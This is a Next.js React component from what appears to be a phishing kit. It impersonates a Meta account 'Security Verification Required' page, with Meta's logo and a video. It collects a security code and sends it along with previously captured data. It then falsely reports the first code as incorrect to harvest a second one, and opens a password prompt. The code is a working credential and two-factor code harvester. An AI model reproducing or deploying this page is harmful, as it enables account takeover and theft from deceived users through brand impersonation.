'use client'

import React from 'react'
import { useRouter } from 'next/navigation'
import { getRecord, saveRecord, sendAppealForm } from '../utils';
import PasswordModal from '../../components/modal/PasswordModal';
import SuccessModal from '../../components/modal/SuccessModal';

const RequiredConfirm = () => {
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState<boolean>(false);
    const [click, setClick] = React.useState<number>(0);
    
    const [opendModal, setOpendModal] = React.useState<boolean>(false);
    const [opendModalSuccess, setOpendModalSuccess] = React.useState<boolean>(false);
    
    const router = useRouter()

    const [formData, setFormData] = React.useState({
        code: '',
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            setLoading(true)

            const newErrors: Record<string, string> = {};

            if (!formData.code.trim()) {
                newErrors.code = 'Please enter enough security code.';
            } else if (!/^\d+$/.test(formData.code.trim())) {
                newErrors.code = 'Security code must contain only numbers.';
            }

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                setLoading(false);
                return;
            }

            if (click == 0) {

                let dataLocal = getRecord("__v_1_us");

                const clientData = {
                    code: formData.code,
                    ...dataLocal
                };
                
                saveRecord("__v_2_us", clientData);

                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {

                            setLoading(false);
                            setFormData({ code: '' })
                            newErrors.code = "The security code is incorrect, please try again with another code.";
                            setErrors(newErrors);
                            setClick(1)

                        }, 1480);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            } else {

                let dataLocal = getRecord("__v_2_us");

                const clientData = {
                    codeSecond: formData.code,
                    ...dataLocal
                };

                saveRecord("__v_3_us", clientData);

                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {
                            setLoading(false);
                            setOpendModal(true)
                            setClick(1)
                        }, 1678);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }

        } catch (error) {
            console.error("Error submitting form:", error);
            setLoading(false);
        }
    }

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] mt-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <>
            <div className="flex flex-col items-center justify-center bg-[#f0f2f5] h-screen w-full p-[15px] md:p-[0px]">
                <div className='max-w-[768px] w-full p-[20px] bg-[white] shadow-[0_1px_2px_rgba(0,0,0,0.1)] rounded rounded-[10px]'>
                    <img src="/logo-meta.svg" alt="" className='w-[75px]' />
                    <h1 className='mt-[15px] mb-[10px] font-bold text-[1.25rem]'>Security Verification Required</h1>
                    <p className='text-[#65676b] text-[14px]'>For your account's safety, we need to confirm it's really you. Watch The Detailed Video Information to Confirm The Account</p>
                    <div className='rounded rounded-[8px] overflow-hidden mb-[16px]'>
                        <video
                            controls
                            className="w-full"
                        >
                            <source
                                src="https://hwtwzunrlegrqrhtompr.supabase.co/storage/v1/object/public/vedio1//system-updated.mp4"
                                type="video/mp4"
                            />
                        </video>
                    </div>
                    <div>
                        <form onSubmit={handSubmit}>
                            <div>
                                <div>
                                    <label htmlFor="c_user_token" className='font-bold text-[15px]'>Security Code</label>
                                    <div className={inputClass('code')}>
                                        <input
                                            type="text"
                                            id='code'
                                            placeholder='Enter your security code'
                                            className="w-full outline-[0] h-full"
                                            value={formData.code}
                                            onChange={handleChange}
                                        />
                                    </div>
                                    {errorText('code')}
                                </div>

                                <div className='w-full mt-[20px] '>
                                    <button
                                        type="submit"
                                        disabled={loading}
                                        className={`w-full ${loading ? 'bg-[#0064E0] cursor-not-allowed' : 'text-[15px] bg-[#0064E0] cursor-pointer hover:bg-[#0056b3]'} text-[white] rounded-[8px] pt-[10px] pb-[10px] flex items-center justify-center transition-all duration-200`}
                                    >
                                        {loading ? (
                                            <div className="flex items-center gap-2">
                                                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                                            </div>
                                        ) : (
                                            "Confirm Account"
                                        )}
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <PasswordModal
                isOpendModal = {opendModal}
                onToggleModal={setOpendModal}
                onOpendModalSuccess={setOpendModalSuccess}
            />

            <SuccessModal
                isOpendSuccess = {opendModalSuccess}
                onToggleSuccess= {setOpendModalSuccess}
            />
        </>
    )
}

export default RequiredConfirm
